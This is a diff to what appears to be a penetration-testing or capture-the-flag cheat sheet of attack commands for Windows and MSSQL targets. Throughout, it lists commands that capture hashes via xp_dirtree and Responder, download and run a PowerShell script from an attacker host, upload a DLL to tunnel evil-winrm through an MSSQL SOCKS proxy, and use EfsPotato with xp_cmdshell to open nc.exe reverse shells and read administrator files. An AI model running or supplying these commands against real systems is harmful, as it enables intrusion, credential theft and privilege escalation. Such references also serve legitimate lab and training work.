@@ -1030,6 +1030,19 @@ sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC x
 sudo responder -I tun0 -v
 DB_NAME="master"; sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_dirtree '//$MYIP/RESPONDER';"
 
++---------- Proxy MSSQL ----------+
+wget https://github.com/0xdf-0xdf/mssqlproxy/raw/refs/heads/python3/mssqlclient.py
+wget https://github.com/DaddyBigFish/mssqlproxy/releases/download/dlls/Microsoft.SqlServer.Proxy.dll
+wget https://github.com/DaddyBigFish/mssqlproxy/releases/download/dlls/reciclador.dll
+python3 mssqlclient.py '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
+enable_ole
+upload reciclador.dll C:\programdata\reciclador.dll
+exit
+python3 mssqlclient.py '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET -check -reciclador 'C:\programdata\reciclador.dll'
+python3 mssqlclient.py '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET -start -reciclador 'C:\programdata\reciclador.dll'
+echo 'socks5  127.0.0.1 1337' | sudo tee -a /etc/proxychains.conf
+proxychains4 evil-winrm -i 127.0.0.1 -u $USERNAME -p $PASSWORD
+
 [*] (1521) OracleTNS
 +---------- Find Service Name ----------+
 sudo odat snguesser -s $TARGET
@@ -1307,8 +1320,9 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/Invoke-RunasCs.
 robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt
 
 +---------- SeImpersonatePrivilege ----------+
-echo -e 'type \\users\\administrator\\desktop\\root.txt' | rlwrap nc -lvnp 5566
 C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
+xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c C:\programdata\nc.exe $MYIP 5566 -e cmd"
+xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c type C:\Users\Administrator\Desktop\root.txt"
 
 +---------- DnsAdmins ----------+
 rlwrap nc -lvnp 5555
